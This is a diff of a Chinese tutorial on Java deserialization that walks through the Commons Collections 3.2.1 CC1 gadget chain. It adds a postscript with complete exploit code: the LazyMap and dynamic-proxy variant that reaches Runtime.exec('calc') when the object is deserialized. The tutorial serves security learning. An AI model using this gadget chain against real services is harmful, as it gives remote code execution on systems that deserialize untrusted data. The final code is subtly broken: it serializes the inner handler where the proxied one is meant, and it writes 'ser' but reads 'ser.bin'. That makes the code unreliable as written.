@@ -4,6 +4,7 @@
 
     1. 了解什么是 java 反序列化
     2. 了解 java 反射
+    3. java 动态代理机制
    
 参考链接
 
@@ -15,26 +16,26 @@
 
 关于 jdk 的版本，这里我选择的是 jdk8u65，可自行在[官网下载](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#:~:text=Java%20SE%20Development%20Kit%208u65)，可在虚拟机里安装，然后把整个目录复制出来，避免污染物理机环境。
 
-![jdk](img/jdk.png)
+![jdk](img_cc1/jdk.png)
 
 因为我们需要调试，所以我们需要 sun 包的源码，jdk 自带的 sun 包是没有源码的，我们从 openjdk 拖一份过来。
 
 来到 https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4 ，点击左侧的 gz 下载，会得到一份上图的 .tar.gz 压缩包，jdk 下原来自带一个 src.zip 对这两个都进行解压，你会得到一个和上图同样的目录结构。我们来到，af660750b2f4\jdk-af660750b2f4\src\share\classes 下，有一个 sun 的文件夹，整个复制到被解压出来的 src 文件夹下。
 最后我们配置下源码路径。
 
-![project](img\projectstruct.png)
+![project](img_cc1\projectstruct.png)
 
 ##### maven
 
 新建一个 maven 项目，按照下图的配置启动，注意配置 jdk 的目录和启动模板。
 
-![maven](img\maven_project.png)
+![maven](img_cc1\maven_project.png)
 
 不会配置 maven 的小伙伴请看 [maven教程](https://www.bilibili.com/video/BV1Fz4y167p5/?p=3&vd_source=953fbf17a8e8d4ac23babb07f8cce168)，看前几章就好。
 
 pom.xml，这里我们选择的是 3.2.1 版本的 Commons Collections。
 
-![pom](img\pom.png)
+![pom](img_cc1\pom.png)
 
 可在maven的仓库搜索到 [mvnrepository](https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1)
 
@@ -42,31 +43,31 @@ pom.xml，这里我们选择的是 3.2.1 版本的 Commons Collections。
 
 首先看下我们需要打交道的接口，可以看到声明了一个 transform 方法。
 
-![interface](img\interface.png)
+![interface](img_cc1\interface.png)
 
 我们来看下它的实现类，ctrl + H 。
 
-![class](img\interface_class.png)
+![class](img_cc1\interface_class.png)
 
 先来看下主角 invokerTransformer 它的 transform 方法。
 
-![invoke](img\invokerTransformer_transoform.png)
+![invoke](img_cc1\invokerTransformer_transoform.png)
 
 可以看到这是一个标准的 java 反射的写法，接受任意类，调用任意方法，如果我们能找到另一个方法，它调用了 invkerTransformer 的 transform 方法，那我们是不是就获得了任意命令执行呢？我们来看下都有谁调用了，find usages ，为了方便我们直接定位过去了。
 
-![usage](img\transform_find_useage.png)
+![usage](img_cc1\transform_find_useage.png)
 
 我们可以看到 TranformedMap 的 checkSetValue 方法调用了 transform 方法， 我们跟进去看看。
 
-![TransformedMap_transformer](img\TransformedMap_transformer.png)
+![TransformedMap_transformer](img_cc1\TransformedMap_transformer.png)
 
 这个 valueTransformer 是什么，我们找下看，往上看。
 
-![TransformedMap_structor](img\TransformedMap_structor.png)
+![TransformedMap_structor](img_cc1\TransformedMap_structor.png)
 
 一个 protected 构造器，那他内部是怎么调用的呢？
 
-![TransformedMap](img\TransformedMap.png)
+![TransformedMap](img_cc1\TransformedMap.png)
 
 是一个 public decorate 方法返回了一个 TransformedMap 实例。
 
@@ -75,7 +76,7 @@ pom.xml，这里我们选择的是 3.2.1 版本的 Commons Collections。
 
 那哪里调用了这个 setValue 方法呢，我们同样 find usages 看一下，这里我们直接来到 AnnotationinvcationHandler 的 readObject 下。我们可以看到，经过一大串判断和操作后 有一个 memberValue.setValue 
 
-![readobject](img\1.png)
+![readobject](img_cc1\1.png)
 
 **貌似这条链已经清晰了**
 
@@ -87,7 +88,7 @@ pom.xml，这里我们选择的是 3.2.1 版本的 Commons Collections。
 
 我们需要解决第一个问题，那就是 Runtime 这个类它是不可以序列化的，他没有继承 Serizlizable 接口。
 
-![Runtime](img\runtime.png)
+![Runtime](img_cc1\runtime.png)
 
 这是普通的反射调用。
 
@@ -139,7 +140,7 @@ Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedT
 
 现在我们有了 transformedMap 实例，我们需要一个 AnnotationinvcationHandler 的实例，我们看下构造函数。
 
-![Annotation](img\Annotation_strct.png)
+![Annotation](img_cc1\Annotation_strct.png)
 
 是一个 default 权限，所以我们同样需要反射调用，我们用的注解类是 Target.class。
 
@@ -234,7 +235,94 @@ public class CC1Test {
 
 效果
 
-![end](img\end.png)
+![end](img_cc1\end.png)
+
+#### 后记
+
+我们看一下 ysoserial 的原始 CC1 链
+
+![ya](img_cc1/ya.png)
+
+可以看出后半段是一样的，那么看下前半段，先看下 Lazymap.get
+
+![lazymap](img_cc1/LazyMap_get.png)
+
+它对 factory 调用 transform 方法，这个和前面的 TranformedMap 的 checkSetValue 方法的调用是异曲同工的。我们来看下 LazyMap 的构造。
+
+![lazymap_cou](img_cc1/LazyMap.png)
+
+同样使用 decorate 返回一个实例，这里我们使用参数类型是 Trasformer 的构造方法。那么哪里能调用 .get 方法呢?
+
+![AnnotationInvocationHandler](img_cc1/Annnotaion_invoke.png)
+
+在 AnnotationInvocationHandler 的 invoke 方法里，我们知道在动态代理中，调用处理器的 invoke 方法会被自动触发。看下两个 if 的判断条件，不能调用 equals 方法，不能调用一个有参方法。那么有没有这么一个调用呢？
+
+![enset](img_cc1/Annotation_readobject_enset.png)
+
+可以看到，同样在这个方法中，有一个 membervalues.entrySet() 的调用，那么他就会调用 invoke 方法。所以我们只需要使用动态代理包裹一下 annotationInvocation 即可。
+
+最终代码
+
+```java
+package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import javax.xml.crypto.dsig.Transform;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1Test {
+    public static void main(String[] args) throws Exception {
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap<Object, Object> map = new HashMap<>();
+        Map lazymap = LazyMap.decorate(map, chainedTransformer);
+
+        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor<?> annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
+        annotationInvocationConstructor.setAccessible(true);
+        InvocationHandler o = ((InvocationHandler) annotationInvocationConstructor.newInstance(Target.class, lazymap));
+
+        Map map1 = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, o);
+        Object o1 = annotationInvocationConstructor.newInstance(Target.class, map1);
+        serialize(o);
+        unserialize("ser.bin");
+
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser"));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+
+```
 
 
 参考链接:
